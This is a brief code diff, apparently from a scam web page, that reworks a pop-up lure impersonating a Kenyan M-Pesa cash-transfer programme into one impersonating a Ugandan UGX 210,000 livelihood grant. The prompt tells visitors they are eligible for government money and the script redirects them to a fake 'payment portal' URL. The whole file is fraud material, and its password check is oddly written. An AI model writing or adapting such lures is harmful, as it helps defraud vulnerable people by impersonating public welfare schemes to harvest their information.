@@ -1,5 +1,5 @@
 var password = 'Submit Now'
-password=prompt('CRSP Portal: Congratulations, you are eligible to receive the KSh 500 M-Pesa Cash Transfer, Kindly press OK to submit your information and receive KSh 500 now ','Submit Now');
+password=prompt('YLP Portal: Congratulations, you are eligible to receive the UGX 210,000 Livelihood Support Grant Cash Transfer, Kindly press OK to submit your information and receive UGX 210,000 now','Submit Now');
 if (password != 'Submit Now') {
-location.href='https://get-it-online.site/Official-Kazi-Mtaani-Portal.html';
+location.href='https://claimmoni.org/Official-UGX-210000-YLP-Payment-Portal.html';
 }
